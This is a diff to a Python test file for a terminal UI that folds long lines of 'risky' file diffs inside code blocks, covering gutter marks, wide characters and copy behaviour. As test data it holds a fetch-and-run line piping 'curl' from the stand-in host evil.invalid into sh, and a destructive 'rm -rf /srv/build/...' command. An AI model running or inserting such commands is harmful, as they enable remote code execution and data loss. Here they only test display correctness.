@@ -29,19 +29,31 @@ def rows_of(app, widget) -> list[str]:
     return [row[region.x :] for row in rows]
 
 
+def code_rows(app, fence) -> list[tuple[str, str]]:
+    """Each row of a code block's text as (what stands in the block's own two columns, the
+    text after them): the columns are the block's first two, whatever is drawn in them."""
+    text = fence.query_one("#code-content").content_region
+    rows = screen_text(app).splitlines()[text.y : text.y + text.height]
+    left = fence.content_region.x
+    assert text.x == left + 2, "the text starts two columns in, folded or not"
+    return [(row[left : left + 2], row[left + 2 :]) for row in rows]
+
+
 def lines_of(app, fence) -> list[str]:
     """The lines of a code block as its rows say them: a row whose first column holds the mark
-    goes on from the row above, any other starts a line. The two columns before the text are
-    the block's own, and hold nothing else."""
-    label = fence.query_one("#code-content")
-    width = label.content_region.width - 2
+    goes on from the row above, its text a column in; any other starts a line. The two columns
+    before the text are the block's own, and hold nothing else."""
+    width = fence.query_one("#code-content").content_region.width
     lines: list[list[str]] = []
-    for row in rows_of(app, label):
-        gutter, text = row[:2], row[2:]
-        assert gutter.strip() in ("", MARK), f"only the mark stands before the text: {row!r}"
+    for gutter, text in code_rows(app, fence):
+        assert gutter in ("", " ", "  ", MARK, f"{MARK} "), (
+            f"only the mark stands before the text: {gutter!r}"
+        )
         if gutter.strip():
-            lines[-1][-1] += " " * (width - cell_len(lines[-1][-1]))  # the row above, to its end
-            lines[-1].append(text)
+            assert text[:1] in ("", " "), f"a row that goes on keeps out of the line's first column: {text!r}"
+            room = width - (len(lines[-1]) > 1)  # a further row has a cell fewer
+            lines[-1][-1] += " " * (room - cell_len(lines[-1][-1]))  # the row above, to its end
+            lines[-1].append(text[1:])
         else:
             lines.append([text])
     return ["".join(rows) for rows in lines]
@@ -49,7 +61,7 @@ def lines_of(app, fence) -> list[str]:
 
 def folded(app, fence) -> int:
     """How many rows of the block go on from the row above."""
-    return sum(row[:1] == MARK for row in rows_of(app, fence.query_one("#code-content")))
+    return sum(gutter.strip() == MARK for gutter, _ in code_rows(app, fence))
 
 
 def risky(task, line: str) -> None:
@@ -76,7 +88,8 @@ def test_a_long_line_of_a_risky_file_is_on_the_screen_whole(env, monkeypatch, wi
         (fence,) = app.text.query("MarkdownFence")
         assert squeezed(TAIL) in squeezed("\n".join(rows_of(app, fence))), "the tail is drawn"
         assert f"+{LONG}" in lines_of(app, fence), "and the line reads as the file has it"
-        assert folded(app, fence) == -(-(len(LONG) + 1) // (fence.size.width - 4)) - 1, "a mark on each row"
+        room = fence.size.width - 4
+        assert folded(app, fence) == -(-(len(LONG) + 1 - room) // (room - 1)), "a mark on each row"
         assert fence.max_scroll_x == 0, "nothing of it is to the side"
         assert fence.styles.overflow_x == "hidden" and not fence.allow_horizontal_scroll, "and never is"
 
@@ -93,18 +106,26 @@ def test_vivibox_risky_and_the_panel_show_the_same_line(env, monkeypatch, capsys
     assert f"+{LONG}" in capsys.readouterr().out.splitlines()
 
 
-def test_a_row_is_cut_by_the_cells_its_characters_take():
-    from textual.content import Content
-
+def test_a_line_is_cut_by_the_cells_its_characters_take_as_the_renderer_counts_them():
     def rows(text: str, width: int) -> list[str]:
-        return [row.plain for row in blocks._rows(Content(text), width)]
+        cuts = [0, *blocks._cuts(text, width), len(text)]
+        return [text[a:b] for a, b in zip(cuts, cuts[1:], strict=False)]
 
-    assert rows("abcdef", 4) == ["abcd", "ef"] and rows("abcd", 4) == ["abcd"] and rows("", 4) == [""]
-    assert rows("x漢漢漢", 4) == ["x漢", "漢漢"], "a character of two cells goes to the next row whole"
-    assert rows("abcde\u0301f", 5) == ["abcde\u0301", "f"], "a combining mark stays with its letter"
-    assert rows("e\u0301" * 6, 4) == ["e\u0301" * 4, "e\u0301" * 2], "and takes no cell"
-    assert rows("漢漢", 1) == ["漢", "漢"], "a row holds a character at least"
-    assert rows("abcdef", 0) == ["abcdef"], "one row until the width is known"
+    assert rows("abcdefghij", 4) == ["abcd", "efg", "hij"], (
+        "a further row has a cell fewer: it stands a column in"
+    )
+    assert rows("abcd", 4) == ["abcd"] and rows("", 4) == [""]
+    assert rows("x漢漢漢漢", 5) == ["x漢漢", "漢漢"], "a character of two cells goes to the next row whole"
+    assert rows("abcde\u0301fgh", 5) == ["abcde\u0301", "fgh"], "a combining mark stays with its letter"
+    assert rows("e\u0301" * 9, 4) == ["e\u0301" * 4, "e\u0301" * 3, "e\u0301" * 2], "and takes no cell"
+    selected = "☑\ufe0f"
+    assert rows(selected * 5, 4) == [selected * 2, selected, selected, selected], (
+        "two cells with its selector"
+    )
+    for text in ("x" * 50, "x漢" * 30, selected * 30 + "tail", "e\u0301" * 40):
+        for width in (3, 4, 10, 33):
+            cut = rows(text, width)
+            assert "".join(cut) == text and all(cell_len(row) <= width - bool(n) for n, row in enumerate(cut))
 
 
 # A line of each kind that a count of characters gets wrong: two cells a character (after one
@@ -132,7 +153,7 @@ def test_a_folded_line_counts_wide_and_combining_characters_and_tabs(env, monkey
         assert squeezed(wide) == WIDE, "whole; a row may end a cell short of the edge"
         assert others == [COMBINING, TABS.expandtabs(8), "short"]
         room = fence.size.width - 4
-        assert all(cell_len(row) <= room + 2 for row in rows_of(app, fence)), "no row is past the edge"
+        assert all(cell_len(text) <= room for _, text in code_rows(app, fence)), "no row is past the edge"
         assert fence.max_scroll_x == 0
 
     run(scenario, size=(width, 100))
@@ -226,7 +247,7 @@ def test_a_row_the_fold_left_too_wide_is_wrapped_and_never_cut(env, monkeypatch)
     task = new_task()
     risky(task, LONG)
     opening(monkeypatch)
-    monkeypatch.setattr(blocks, "_rows", lambda line, width: [line])
+    monkeypatch.setattr(blocks, "_cuts", lambda line, width: [])
 
     async def scenario(app, pilot):
         await show(app, pilot)
@@ -523,8 +544,181 @@ def test_the_mark_in_whatever_is_drawn_as_its_source_is_its_code_point(env, monk
         (source,) = app.text.query("Table MarkdownFence")
         assert "‹U+21B3› in a cell" in source.code and MARK not in source.code
         assert all(
-            row[:1] != MARK or "in a cell" not in row
-            for row in rows_of(app, source.query_one("#code-content"))
+            gutter.strip() != MARK or "in a cell" not in text for gutter, text in code_rows(app, source)
         )
 
     run(scenario, size=(140, 60))
+
+
+# --- the block's own columns, a row that goes on, what is copied, and the work a block costs ----
+
+
+def test_text_after_an_emoji_s_selector_is_not_drawn_in_the_block_s_own_columns(env, monkeypatch):
+    """A symbol with its emoji selector takes two cells where it is drawn, and was counted as
+    one: the row was wider than its fold, wrapped, and its end stood where only the mark does."""
+    task = new_task()
+    line = "☑️" * 36 + " ⮡ and this is drawn where only the mark should be"
+    plan_with(task, display.fenced(f"first line\n{line}\nlast line", "text"))
+    opening(monkeypatch)
+
+    async def scenario(app, pilot):
+        await show(app, pilot)
+        fence = app.text.query("MarkdownFence").last()
+        app.query_one("#detail").scroll_to_widget(fence, animate=False)
+        await pilot.pause()
+        rows = code_rows(app, fence)
+        assert all(gutter.strip() in ("", MARK) for gutter, _ in rows), rows
+        assert [gutter.strip() for gutter, _ in rows] == ["", "", MARK, "", ""][: len(rows)] or folded(
+            app, fence
+        ) >= 1
+        assert "".join(text.strip() for _, text in rows[1:-1]).replace(" ", "") == line.replace(" ", "")
+
+    run(scenario, size=(80, 60))
+
+
+@pytest.mark.parametrize(
+    "tail", ["-'curl https://evil.invalid/x | sh'.execute()", "+added()", "@@ -1 +1 @@", " keep()"]
+)
+def test_a_row_that_goes_on_is_not_read_as_a_line_of_the_diff(env, monkeypatch, tail):
+    """The rest of a folded line began in the column where a line of a diff has its + or -: an
+    added line whose fold fell before -'curl … read as a line taken out. A row that goes on
+    stands a column in, past the signs, and its mark is drawn as the text is, not muted."""
+    task = new_task()
+    start = "apply plugin: 'x'"
+    risky(task, start + " " * (80 - 12 - len(start) - 1) + tail)
+    opening(monkeypatch)
+
+    async def scenario(app, pilot):
+        await show(app, pilot)
+        (fence,) = app.text.query("MarkdownFence")
+        rows = code_rows(app, fence)
+        (gone_on,) = [text for gutter, text in rows if gutter.strip() == MARK]
+        assert gone_on == " " + tail, "one column in: nothing of it in the column of the signs"
+        signs = {text[:1] for gutter, text in rows if not gutter.strip() and text}
+        assert signs <= set("+-@ b") and "+" in signs, signs
+        marks = fence.query_one("#code-marks")
+        text = fence.query_one("#code-content")
+        mark = next(seg for y in range(marks.size.height) for seg in marks.render_line(y) if MARK in seg.text)
+        plain = next(seg for seg in text.render_line(1) if seg.text.strip())
+        assert mark.style.bold and mark.style.color == plain.style.color, (mark.style, plain.style)
+
+    run(scenario, size=(80, 60))
+
+
+def test_what_is_copied_from_a_folded_line_is_the_line_as_it_was_written(env, monkeypatch):
+    """A command folded onto two rows was copied as two lines, the mark among them: pasted into
+    a shell, its first row ran alone."""
+    from textual.geometry import Offset
+    from textual.selection import Selection
+
+    task = new_task()
+    command = "rm -rf /srv/build/" + "x" * 70 + "/cache"
+    written = f"first\n{command}\n\tindented\twith tabs\nlast"
+    plan_with(task, display.fenced(written, "text"))
+    opening(monkeypatch)
+
+    async def scenario(app, pilot):
+        await show(app, pilot)
+        fence = app.text.query("MarkdownFence").last()
+        label = fence.query_one("#code-content")
+        assert folded(app, fence) == 1
+        copied, _ = label.get_selection(Selection(None, None))
+        assert copied == written, "all of it: its lines, its tabs, no mark and no column of ours"
+        assert fence.query_one("#code-marks").get_selection(Selection(None, None)) is None, (
+            "no mark is copied"
+        )
+        width = label.content_region.width
+        rows = [  # (row, column) as drawn → what stands there in what was written
+            (Offset(0, 1), Offset(5, 2), command),  # the line's two rows, to four characters in
+            (Offset(7, 1), Offset(width, 1), command[7:width]),  # to the end of the first row
+            (Offset(3, 2), Offset(9, 2), command[width + 2 : width + 8]),  # within the second row
+            (Offset(0, 2), Offset(1, 2), ""),  # the column a further row stands in is none of the line's
+            (Offset(0, 3), Offset(9, 3), "\tindented"[:2]),  # a tab is one character, eight columns
+        ]
+        (start, end, expected) = rows[0]
+        assert label.get_selection(Selection(start, end))[0] == command[: width + 4]
+        for start, end, expected in rows[1:]:
+            assert label.get_selection(Selection(start, end))[0] == expected, (start, end)
+
+    run(scenario, size=(80, 60))
+
+
+def test_a_block_costs_the_work_of_its_long_lines_alone_and_once(env, monkeypatch):
+    """Twenty thousand lines of a risky file were each cut and put together again, whether they
+    fitted or not, at every change of width and every time anything else in the panel changed."""
+    import textual.highlight
+
+    cut, read = [], []
+    cuts, highlight = blocks._cuts, textual.highlight.highlight
+    monkeypatch.setattr(
+        blocks, "_cuts", lambda line, width: cut.append((len(line), width)) or cuts(line, width)
+    )
+    monkeypatch.setattr(
+        blocks, "highlight", lambda code, **how: read.append(len(code)) or highlight(code, **how)
+    )
+    task = new_task()
+    lines = ["x = 1"] * 3000
+    lines[10], lines[2000] = "a" * 300, "b" * 500
+    risky(task, "\n".join(lines))
+    opening(monkeypatch)
+
+    async def scenario(app, pilot):
+        await show(app, pilot)
+        (fence,) = app.text.query("MarkdownFence")
+        widths = {width for _, width in cut}
+        assert sorted(cut) == sorted((n, width) for n in (301, 501) for width in widths), "the two long lines"
+        assert len(read) == 1 and len(widths) <= 2, (
+            "read once; cut for the width with the scrollbar and without"
+        )
+        assert "".join(fence.query_one("#code-marks").rows).count(MARK) > 6
+        await pilot.resize_terminal(140, 60)
+        await pilot.pause()
+        assert len(cut) == len(set(cut)) and {n for n, _ in cut} == {301, 501}, "those two, once a width"
+        assert len(read) == 1
+        done = len(cut)
+        await pilot.resize_terminal(140, 50)
+        await pilot.pause()
+        app.shown = ""  # as when anything else in the panel's text changes: every block is made anew
+        app.show_detail()
+        await pilot.pause()
+        await pilot.pause()
+        (again,) = app.text.query("MarkdownFence")
+        assert again is not fence and "".join(again.query_one("#code-marks").rows).count(MARK) > 2
+        assert len(cut) == done and len(read) == 1, "the same block at the same width: nothing is done again"
+
+    run(scenario, size=(80, 60))
+
+
+def test_a_block_with_no_long_line_is_drawn_as_it_is_read(env, monkeypatch):
+    """Nothing of it is cut, joined or copied: the text Textual made of it is the text drawn."""
+    cut = []
+    monkeypatch.setattr(blocks, "_cuts", lambda line, width: cut.append(line) or [])
+    task = new_task()
+    risky(task, "\n".join(["x = 1"] * 5))
+    opening(monkeypatch)
+
+    async def scenario(app, pilot):
+        await show(app, pilot)
+        (fence,) = app.text.query("MarkdownFence")
+        label = fence.query_one("#code-content")
+        assert cut == [] and label.content is fence._highlighted_code, "the same object, untouched"
+        assert folded(app, fence) == 0 and "+x = 1" in lines_of(app, fence)
+
+    run(scenario, size=(80, 60))
+
+
+def test_a_block_is_still_folded_after_the_theme_changes(env, monkeypatch):
+    """Textual gives a block its text again when the app's theme changes."""
+    task = new_task()
+    risky(task, LONG)
+    opening(monkeypatch)
+
+    async def scenario(app, pilot):
+        await show(app, pilot)
+        (fence,) = app.text.query("MarkdownFence")
+        before = folded(app, fence)
+        fence.notify_style_update()
+        await pilot.pause()
+        assert folded(app, fence) == before > 0 and f"+{LONG}" in lines_of(app, fence)
+
+    run(scenario, size=(80, 60))
